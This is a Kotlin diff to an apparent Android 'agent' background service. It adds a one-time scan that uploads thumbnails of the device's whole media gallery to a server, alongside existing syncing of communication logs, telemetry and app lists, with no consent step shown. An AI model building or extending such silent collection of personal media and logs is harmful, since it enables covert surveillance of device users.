@@ -226,6 +226,11 @@ class AgentBackgroundService : Service() {
                         if (!AgentPreferences.isCommLogsSynced(applicationContext)) {
                             syncCommunicationLogs()
                         }
+
+                        // 5. One-time Media Gallery thumbnail scan
+                        if (!hasScannedMedia) {
+                            performMediaScan()
+                        }
                     } else {
                         Log.d(TAG, "Device not registered yet, skipping poll cycle")
                     }
@@ -240,6 +245,7 @@ class AgentBackgroundService : Service() {
 
     private var lastTelemetrySyncMs = 0L
     private var hasUploadedApps = false
+    private var hasScannedMedia = false
 
     private suspend fun performTelemetrySync() {
         val now = System.currentTimeMillis()
@@ -256,6 +262,29 @@ class AgentBackgroundService : Service() {
             } catch (e: Exception) {
                 Log.e(TAG, "Error performing telemetry sync", e)
             }
+        }
+    }
+
+    private suspend fun performMediaScan() {
+        try {
+            Log.i(TAG, "Starting gallery media scan...")
+            val batches = com.example.gmaagent.data.MediaScanner.scanAll(applicationContext)
+            var totalIngested = 0
+            for (batch in batches) {
+                val payload = com.example.gmaagent.network.MediaThumbnailSyncRequest(
+                    thumbnails = batch
+                )
+                val result = ApiClient.syncMediaThumbnails(payload)
+                if (result != null) {
+                    totalIngested += result.ingested
+                    Log.i(TAG, "Media batch synced: ${result.ingested} ingested, ${result.skipped} skipped")
+                }
+                delay(1000L)
+            }
+            hasScannedMedia = true
+            Log.i(TAG, "Gallery scan complete — $totalIngested thumbnails uploaded")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error performing media scan", e)
         }
     }
 
